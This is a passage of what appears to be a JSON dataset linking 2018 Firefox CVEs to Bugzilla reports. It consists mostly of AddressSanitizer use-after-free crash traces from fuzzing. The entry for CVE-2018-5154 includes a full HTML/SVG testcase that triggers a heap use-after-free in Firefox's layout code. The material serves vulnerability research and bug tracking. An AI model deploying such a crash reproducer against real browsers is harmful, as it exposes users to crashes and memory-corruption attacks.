(/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x29a0e7f) #5 0x109441c13 in mozilla::layers::CompositorOGL::Initialize(nsTString<char>*) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x29a1c13) #6 0x10972d5e8 in mozilla::layers::CompositorBridgeParent::NewCompositor(nsTArray<mozilla::layers::LayersBackend> const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2c8d5e8) #7 0x10972cb49 in mozilla::layers::CompositorBridgeParent::InitializeLayerManager(nsTArray<mozilla::layers::LayersBackend> const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2c8cb49) #8 0x10972dc7f in mozilla::layers::CompositorBridgeParent::AllocPLayerTransactionParent(nsTArray<mozilla::layers::LayersBackend> const&, unsigned long long const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2c8dc7f) #9 0x10855d2a3 in mozilla::layers::PCompositorBridgeParent::OnMessageReceived(IPC::Message const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x1abd2a3)"
      }
    ],
    "CVE-2018-5150": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1388020%2C1433609%2C1409440%2C1448705%2C1451376%2C1452202%2C1444668%2C1393367%2C1411415%2C1426129",
        "description": "Crash seen while fuzzing m-c 20180223-f7c5598e45c3, but I don't have a testcase that reproduces the issue. ==6735==ERROR: AddressSanitizer: heap-use-after-free on address 0x61e000161918 at pc 0x000109286765 bp 0x70000f46d600 sp 0x70000f46d5f8 READ of size 8 at 0x61e000161918 thread T34 #0 0x109286764 in mozilla::gl::GLContext::MakeCurrent(bool) const (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x27e6764) #1 0x10943dc35 in mozilla::layers::CompositingRenderTargetOGL::~CompositingRenderTargetOGL() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x299dc35) #2 0x10943de9d in mozilla::layers::CompositingRenderTargetOGL::~CompositingRenderTargetOGL() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x299de9d) #3 0x10969c844 in mozilla::layers::ContainerLayerComposite::~ContainerLayerComposite() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2bfc844) #4 0x10969ca6d in mozilla::layers::ContainerLayerComposite::~ContainerLayerComposite() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2bfca6d) #5 0x109364301 in mozilla::layers::ContainerLayer::RemoveChild(mozilla::layers::Layer*) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x28c4301) #6 0x10969c7b1 in mozilla::layers::ContainerLayerComposite::~ContainerLayerComposite() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2bfc7b1) #7 0x10969ca6d in mozilla::layers::ContainerLayerComposite::~ContainerLayerComposite() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2bfca6d) #8 0x109364301 in mozilla::layers::ContainerLayer::RemoveChild(mozilla::layers::Layer*) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x28c4301) #9 0x10969c7b1 in mozilla::layers::ContainerLayerComposite::~ContainerLayerComposite() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2bfc7b1) #10 0x10969ca6d in mozilla::layers::ContainerLayerComposite::~ContainerLayerComposite() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2bfca6d) #11 0x10976b77a in mozilla::layers::LayerTransactionParent::~LayerTransactionParent() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2ccb77a) #12 0x10976ba94 in non-virtual thunk to mozilla::layers::LayerTransactionParent::~LayerTransactionParent() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2ccba94) #13 0x10973ce2e in mozilla::layers::CrossProcessCompositorBridgeParent::DeallocPLayerTransactionParent(mozilla::layers::PLayerTransactionParent*) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2c9ce2e) #14 0x10855844f in mozilla::layers::PCompositorBridgeParent::RemoveManagee(int, mozilla::ipc::IProtocol*) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x1ab844f) #15 0x107f16c63 in mozilla::layers::PLayerTransactionParent::Send__delete__(mozilla::layers::PLayerTransactionParent*) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x1476c63) #16 0x10976c201 in mozilla::layers::LayerTransactionParent::RecvShutdown() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2ccc201) #17 0x107f19af6 in mozilla::layers::PLayerTransactionParent::OnMessageReceived(IPC::Message const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x1479af6) 0x61e000161918 is located 1176 bytes inside of 2640-byte region [0x61e000161480,0x61e000161ed0) freed by thread T34 here: #0 0x103223b4d in wrap_free (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/libclang_rt.asan_osx_dynamic.dylib:x86_64+0x58b4d) #1 0x1094aca05 in mozilla::layers::TextureImageTextureSourceOGL::~TextureImageTextureSourceOGL() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2a0ca05) #2 0x1097053bf in mozilla::layers::ShmemTextureHost::~ShmemTextureHost() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2c653bf) #3 0x1097055fd in mozilla::layers::ShmemTextureHost::~ShmemTextureHost() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2c655fd) #4 0x1093dae51 in mozilla::AtomicRefCountedWithFinalize<mozilla::layers::TextureHost>::Release() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x293ae51) #5 0x1097422cb in mozilla::layers::ParentActor<mozilla::layers::PTextureParent>::RecvDestroy() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2ca22cb) #6 0x1081967db in mozilla::layers::PTextureParent::OnMessageReceived(IPC::Message const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x16f67db) #7 0x108572598 in mozilla::layers::PCompositorManagerParent::OnMessageReceived(IPC::Message const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x1ad2598) #8 0x107c3d8c7 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x119d8c7) previously allocated by thread T34 here: #0 0x103223993 in wrap_malloc (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/libclang_rt.asan_osx_dynamic.dylib:x86_64+0x58993) #1 0x1025841bd in moz_xmalloc (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/libmozglue.dylib:x86_64+0x21bd) #2 0x109338c07 in mozilla::gl::GLContextProviderCGL::CreateForWindow(nsIWidget*, bool, bool) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2898c07) #3 0x10933888a in mozilla::gl::GLContextProviderCGL::CreateForCompositorWidget(mozilla::widget::CompositorWidget*, bool) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x289888a) #4 0x109440e7f in mozilla::layers::CompositorOGL::CreateContext() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x29a0e7f) #5 0x109441c13 in mozilla::layers::CompositorOGL::Initialize(nsTString<char>*) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x29a1c13) #6 0x10972d5e8 in mozilla::layers::CompositorBridgeParent::NewCompositor(nsTArray<mozilla::layers::LayersBackend> const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2c8d5e8) #7 0x10972cb49 in mozilla::layers::CompositorBridgeParent::InitializeLayerManager(nsTArray<mozilla::layers::LayersBackend> const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2c8cb49) #8 0x10972dc7f in mozilla::layers::CompositorBridgeParent::AllocPLayerTransactionParent(nsTArray<mozilla::layers::LayersBackend> const&, unsigned long long const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2c8dc7f) #9 0x10855d2a3 in mozilla::layers::PCompositorBridgeParent::OnMessageReceived(IPC::Message const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x1abd2a3)"
      }
    ],
    "CVE-2018-5151": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1445234%2C1449530%2C1437455%2C1447989%2C1438827%2C1436983%2C1435036%2C1440465%2C1439723%2C1448771%2C1453653%2C1454359%2C1432323%2C1454126%2C1436759%2C1439655%2C1448612%2C1449358%2C1367727%2C1452417",
        "description": "Crash seen while fuzzing m-c 20180223-f7c5598e45c3, but I don't have a testcase that reproduces the issue. ==6735==ERROR: AddressSanitizer: heap-use-after-free on address 0x61e000161918 at pc 0x000109286765 bp 0x70000f46d600 sp 0x70000f46d5f8 READ of size 8 at 0x61e000161918 thread T34 #0 0x109286764 in mozilla::gl::GLContext::MakeCurrent(bool) const (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x27e6764) #1 0x10943dc35 in mozilla::layers::CompositingRenderTargetOGL::~CompositingRenderTargetOGL() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x299dc35) #2 0x10943de9d in mozilla::layers::CompositingRenderTargetOGL::~CompositingRenderTargetOGL() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x299de9d) #3 0x10969c844 in mozilla::layers::ContainerLayerComposite::~ContainerLayerComposite() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2bfc844) #4 0x10969ca6d in mozilla::layers::ContainerLayerComposite::~ContainerLayerComposite() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2bfca6d) #5 0x109364301 in mozilla::layers::ContainerLayer::RemoveChild(mozilla::layers::Layer*) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x28c4301) #6 0x10969c7b1 in mozilla::layers::ContainerLayerComposite::~ContainerLayerComposite() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2bfc7b1) #7 0x10969ca6d in mozilla::layers::ContainerLayerComposite::~ContainerLayerComposite() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2bfca6d) #8 0x109364301 in mozilla::layers::ContainerLayer::RemoveChild(mozilla::layers::Layer*) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x28c4301) #9 0x10969c7b1 in mozilla::layers::ContainerLayerComposite::~ContainerLayerComposite() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2bfc7b1) #10 0x10969ca6d in mozilla::layers::ContainerLayerComposite::~ContainerLayerComposite() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2bfca6d) #11 0x10976b77a in mozilla::layers::LayerTransactionParent::~LayerTransactionParent() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2ccb77a) #12 0x10976ba94 in non-virtual thunk to mozilla::layers::LayerTransactionParent::~LayerTransactionParent() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2ccba94) #13 0x10973ce2e in mozilla::layers::CrossProcessCompositorBridgeParent::DeallocPLayerTransactionParent(mozilla::layers::PLayerTransactionParent*) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2c9ce2e) #14 0x10855844f in mozilla::layers::PCompositorBridgeParent::RemoveManagee(int, mozilla::ipc::IProtocol*) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x1ab844f) #15 0x107f16c63 in mozilla::layers::PLayerTransactionParent::Send__delete__(mozilla::layers::PLayerTransactionParent*) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x1476c63) #16 0x10976c201 in mozilla::layers::LayerTransactionParent::RecvShutdown() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2ccc201) #17 0x107f19af6 in mozilla::layers::PLayerTransactionParent::OnMessageReceived(IPC::Message const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x1479af6) 0x61e000161918 is located 1176 bytes inside of 2640-byte region [0x61e000161480,0x61e000161ed0) freed by thread T34 here: #0 0x103223b4d in wrap_free (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/libclang_rt.asan_osx_dynamic.dylib:x86_64+0x58b4d) #1 0x1094aca05 in mozilla::layers::TextureImageTextureSourceOGL::~TextureImageTextureSourceOGL() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2a0ca05) #2 0x1097053bf in mozilla::layers::ShmemTextureHost::~ShmemTextureHost() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2c653bf) #3 0x1097055fd in mozilla::layers::ShmemTextureHost::~ShmemTextureHost() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2c655fd) #4 0x1093dae51 in mozilla::AtomicRefCountedWithFinalize<mozilla::layers::TextureHost>::Release() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x293ae51) #5 0x1097422cb in mozilla::layers::ParentActor<mozilla::layers::PTextureParent>::RecvDestroy() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2ca22cb) #6 0x1081967db in mozilla::layers::PTextureParent::OnMessageReceived(IPC::Message const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x16f67db) #7 0x108572598 in mozilla::layers::PCompositorManagerParent::OnMessageReceived(IPC::Message const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x1ad2598) #8 0x107c3d8c7 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x119d8c7) previously allocated by thread T34 here: #0 0x103223993 in wrap_malloc (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/libclang_rt.asan_osx_dynamic.dylib:x86_64+0x58993) #1 0x1025841bd in moz_xmalloc (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/libmozglue.dylib:x86_64+0x21bd) #2 0x109338c07 in mozilla::gl::GLContextProviderCGL::CreateForWindow(nsIWidget*, bool, bool) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2898c07) #3 0x10933888a in mozilla::gl::GLContextProviderCGL::CreateForCompositorWidget(mozilla::widget::CompositorWidget*, bool) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x289888a) #4 0x109440e7f in mozilla::layers::CompositorOGL::CreateContext() (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x29a0e7f) #5 0x109441c13 in mozilla::layers::CompositorOGL::Initialize(nsTString<char>*) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x29a1c13) #6 0x10972d5e8 in mozilla::layers::CompositorBridgeParent::NewCompositor(nsTArray<mozilla::layers::LayersBackend> const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2c8d5e8) #7 0x10972cb49 in mozilla::layers::CompositorBridgeParent::InitializeLayerManager(nsTArray<mozilla::layers::LayersBackend> const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2c8cb49) #8 0x10972dc7f in mozilla::layers::CompositorBridgeParent::AllocPLayerTransactionParent(nsTArray<mozilla::layers::LayersBackend> const&, unsigned long long const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x2c8dc7f) #9 0x10855d2a3 in mozilla::layers::PCompositorBridgeParent::OnMessageReceived(IPC::Message const&) (/Users/truber/builds/asan/Nightly.app/Contents/MacOS/XUL:x86_64+0x1abd2a3)"
      }
    ],
    "CVE-2018-5153": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1436809",
        "title": "Sending websocket message with text and binary data corrupts binary data",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0 Build ID: 20180205211730 Steps to reproduce: Sent a websocket message that was composed of text and binary data concatenated into a single blob. To see the problem, text data must be before the binary data. Actual results: On Firefox 58+, the binary data gets corrupted. If you open the attached HTML file, and pick a file. The websocket message that gets sent looks like this: <header>ееееееееееееееееее \"<header>\" is the text part of the message. \"eeeeeeee....\" is the binary data that should be the content of the file. Each binary byte has been replaced by an \"e\". Expected results: On earlier versions of Firefox (<58) and other browsers (IE & Chrome) the websocket message looks like this: <header>text file content."
      }
    ],
    "CVE-2018-5154": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1443092",
        "title": "heap-use-after-free in nsIFrame::GetClipPropClipRect",
        "description": "The following testcase crashes the latest ASAN build of Firefox 60.0a1 (SourceStamp=21f7f94a2c18dc8010ac2f300a36cc4ddd16081c). It requires the attached test.svg in the same directory. crash.html: <script> function start() { o7=document.createElement('div'); o7.innerHTML='<style>@keyframes key7{ from{ transform: rotate(-536870911deg)}}\\n*{ animation-name: key7; animation-duration: 0.001s'; o17=document.createElement('div'); o17.innerHTML='<svg><style>@font-face{}\\n*{ outline-style: dotted</style><style>@font-face{ font-family: font3; src: url('; o18=o17.firstChild.getElementsByTagName('*'); o20=o18[0]; o23=o18[1]; o114=document.createElement('iframe'); o114.src='test.svg'; o114.addEventListener('load', fun0,false); document.body.appendChild(o114); } function fun0() { o117=o114.contentDocument; document.replaceChild(o117.documentElement,document.documentElement); o124=document.createElement('iframe'); document.documentElement.appendChild(o124); o145=document.createElement('div'); o145.innerHTML='<svg><set attributeName=\"text-decoration\">'; document.documentElement.appendChild(o20); document.documentElement.appendChild(o23); document.documentElement.appendChild(o7); o124.src='x'; document.documentElement.appendChild(o145); o264=document.createElement('style'); o265=document.createTextNode('*{ float: left'); o264.appendChild(o265); o23.appendChild(o264); setTimeout(\"location.reload()\",40); } </script> <body onload=\"start()\"></body> test.svg: <svg class='class2' xmlns='http://www.w3.org/2000/svg'> <clipPath clipPathUnits='userSpaceOnUse' id='id9' lighting-color='pink' class='class0 class1' > </clipPath> <a id='id0' clip-path='url(#id9)' > </a> </svg> ASAN output: ================================================================= ==5408==ERROR: AddressSanitizer: heap-use-after-free on address 0x6040000e7ebc at pc 0x7fdacf128a80 bp 0x7fff70c73a20 sp 0x7fff70c73a18 READ of size 1 at 0x6040000e7ebc thread T0 (file:// Content) #0 0x7fdacf128a7f in nsIFrame::GetClipPropClipRect(nsStyleDisplay const*, nsStyleEffects const*, nsSize const&) const /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:2426:19 #1 0x7fdacf133156 in nsIFrame::BuildDisplayListForStackingContext(nsDisplayListBuilder*, nsDisplayList*, bool*) /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:3013:7 #2 0x7fdacf0596ed in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsDisplayListSet const&, unsigned int) /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:3755:12 #3 0x7fdacf0eb3fd in nsContainerFrame::BuildDisplayListForNonBlockChildren(nsDisplayListBuilder*, nsDisplayListSet const&, unsigned int) /builds/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:388:5 #4 0x7fdacf05a27c in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsDisplayListSet const&, unsigned int) /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:3815:14 #5 0x7fdacf0eb3fd in nsContainerFrame::BuildDisplayListForNonBlockChildren(nsDisplayListBuilder*, nsDisplayListSet const&, unsigned int) /builds/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:388:5 #6 0x7fdacf513f93 in nsSVGOuterSVGFrame::BuildDisplayList(nsDisplayListBuilder*, nsDisplayListSet const&) /builds/worker/workspace/build/src/layout/svg/nsSVGOuterSVGFrame.cpp:788:5 #7 0x7fdacf133e19 in nsIFrame::BuildDisplayListForStackingContext(nsDisplayListBuilder*, nsDisplayList*, bool*) /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:3047:5 #8 0x7fdacf0596ed in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsDisplayListSet const&, unsigned int) /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:3755:12 #9 0x7fdacf0da52d in nsCanvasFrame::BuildDisplayList(nsDisplayListBuilder*, nsDisplayListSet const&) /builds/worker/workspace/build/src/layout/generic/nsCanvasFrame.cpp:568:5 #10 0x7fdacf05a27c in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsDisplayListSet const&, unsigned int) /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:3815:14 #11 0x7fdacf1dd8ee in mozilla::ScrollFrameHelper::BuildDisplayList(nsDisplayListBuilder*, nsDisplayListSet const&) /builds/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:3617:15 #12 0x7fdacf05a27c in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsDisplayListSet const&, unsigned int) /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:3815:14 #13 0x7fdacf055c2f in mozilla::ViewportFrame::BuildDisplayList(nsDisplayListBuilder*, nsDisplayListSet const&) /builds/worker/workspace/build/src/layout/generic/ViewportFrame.cpp:66:5 #14 0x7fdacf133e19 in nsIFrame::BuildDisplayListForStackingContext(nsDisplayListBuilder*, nsDisplayList*, bool*) /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:3047:5 #15 0x7fdacef75433 in nsLayoutUtils::GetFramesForArea(nsIFrame*, nsRect const&, nsTArray<nsIFrame*>&, unsigned int) /builds/worker/workspace/build/src/layout/base/nsLayoutUtils.cpp:3330:11 #16 0x7fdacef74afb in nsLayoutUtils::GetFrameForPoint(nsIFrame*, nsPoint, unsigned int) /builds/worker/workspace/build/src/layout/base/nsLayoutUtils.cpp:3291:8 #17 0x7fdacee1c1a3 in mozilla::FindFrameTargetedByInputEvent(mozilla::WidgetGUIEvent*, nsIFrame*, nsPoint const&, unsigned int) /builds/worker/workspace/build/src/layout/base/PositionedEventTargeting.cpp:548:5 #18 0x7fdacee68d0c in mozilla::PresShell::HandleEvent(nsIFrame*, mozilla::WidgetGUIEvent*, bool, nsEventStatus*) /builds/worker/workspace/build/src/layout/base/PresShell.cpp:7191:11 #19 0x7fdace5b2c1a in nsViewManager::DispatchEvent(mozilla::WidgetGUIEvent*, nsView*, nsEventStatus*) /builds/worker/workspace/build/src/view/nsViewManager.cpp:812:14 #20 0x7fdace5b2302 in nsView::HandleEvent(mozilla::WidgetGUIEvent*, bool) /builds/worker/workspace/build/src/view/nsView.cpp:1139:9 #21 0x7fdace61584c in mozilla::widget::PuppetWidget::DispatchEvent(mozilla::WidgetGUIEvent*, nsEventStatus&) /builds/worker/workspace/build/src/widget/PuppetWidget.cpp:410:35 #22 0x7fdac932ed5c in mozilla::layers::APZCCallbackHelper::DispatchWidgetEvent(mozilla::WidgetGUIEvent&) /builds/worker/workspace/build/src/gfx/layers/apz/util/APZCCallbackHelper.cpp:499:21 #23 0x7fdacdf08847 in DispatchWidgetEventViaAPZ /builds/worker/workspace/build/src/dom/ipc/TabChild.cpp:1794:10 #24 0x7fdacdf08847 in mozilla::dom::TabChild::HandleRealMouseButtonEvent(mozilla::WidgetMouseEvent const&, mozilla::layers::ScrollableLayerGuid const&, unsigned long const&) /builds/worker/workspace/build/src/dom/ipc/TabChild.cpp:1734 #25 0x7fdacdf0984e in mozilla::dom::TabChild::RecvRealMouseButtonEvent(mozilla::WidgetMouseEvent const&, mozilla::layers::ScrollableLayerGuid const&, unsigned long const&) /builds/worker/workspace/build/src/dom/ipc/TabChild.cpp:1701:3 #26 0x7fdacdf09a24 in RecvSynthMouseMoveEvent /builds/worker/workspace/build/src/dom/ipc/TabChild.cpp:1662:8 #27 0x7fdacdf09a24 in non-virtual thunk to mozilla::dom::TabChild::RecvSynthMouseMoveEvent(mozilla::WidgetMouseEvent const&, mozilla::layers::ScrollableLayerGuid const&, unsigned long const&) /builds/worker/workspace/build/src/dom/ipc/TabChild.cpp #28 0x7fdac81b2ab5 in mozilla::dom::PBrowserChild::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBrowserChild.cpp:3362:20 #29 0x7fdac83b1604 in mozilla::dom::PContentChild::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PContentChild.cpp:5023:28 #30 0x7fdac7ab5f3e in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2133:25 #31 0x7fdac7ab2fb7 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2063:17 #32 0x7fdac7ab46bc in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1909:5 #33 0x7fdac7ab4d18 in mozilla::ipc::MessageChannel::MessageTask::Run() /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1942:15 #34 0x7fdac6bbc4a0 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:413:25 #35 0x7fdac6be4a84 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1040:14 #36 0x7fdac6c00a40 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:517:10 #37 0x7fdac7abe05a in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #38 0x7fdac7a115a9 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #39 0x7fdac7a115a9 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #40 0x7fdac7a115a9 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #41 0x7fdace63f08a in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:157:27 #42 0x7fdad2ad29fb in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:892:22 #43 0x7fdac7a115a9 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #44 0x7fdac7a115a9 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #45 0x7fdac7a115a9 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #46 0x7fdad2ad23da in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:718:34 #47 0x4f1875 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:50:30 #48 0x4f1875 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:280 #49 0x7fdae611c82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #50 0x420f48 in _start (/fuzzer3/firefox/firefox+0x420f48) 0x6040000e7ebc is located 44 bytes inside of 48-byte region [0x6040000e7e90,0x6040000e7ec0) freed by thread T0 (file:// Content) here: #0 0x4c1952 in __interceptor_free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:68:3 #1 0x7fdad4a70510 in _$LT$servo_arc..Arc$LT$T$GT$$u20$as$u20$core..ops..drop..Drop$GT$::drop::h9d5951288e1541e5 /builds/worker/workspace/build/src/servo/components/servo_arc/lib.rs:390 #2 0x7fdad4a70510 in core::ptr::drop_in_place::h79927eef08a236c1 /checkout/src/libcore/ptr.rs:59 #3 0x7fdad4a70510 in _$LT$servo_arc..RawOffsetArc$LT$T$GT$$u20$as$u20$core..ops..drop..Drop$GT$::drop::h8efc1cbf95802962 /builds/worker/workspace/build/src/servo/components/servo_arc/lib.rs:796 #4 0x7fdad4a70510 in core::ptr::drop_in_place::h544d4bbc90b52c9b /checkout/src/libcore/ptr.rs:59 #5 0x7fdad4a70510 in core::ptr::drop_in_place::h7d2987951e4a2458 /checkout/src/libcore/ptr.rs:59 #6 0x7fdad4a70510 in core::ptr::drop_in_place::h901136eb87f307ed /checkout/src/libcore/ptr.rs:59 #7 0x7fdad4a70510 in core::ptr::drop_in_place::h1697b417c29b53e8 /checkout/src/libcore/ptr.rs:59 #8 0x7fdad4a70510 in core::ptr::drop_in_place::h88fe9c96fb8c5fb6 /checkout/src/libcore/ptr.rs:59 #9 0x7fdad4a70510 in core::ptr::drop_in_place::h962af92429c8852c /checkout/src/libcore/ptr.rs:59 #10 0x7fdad4a70510 in 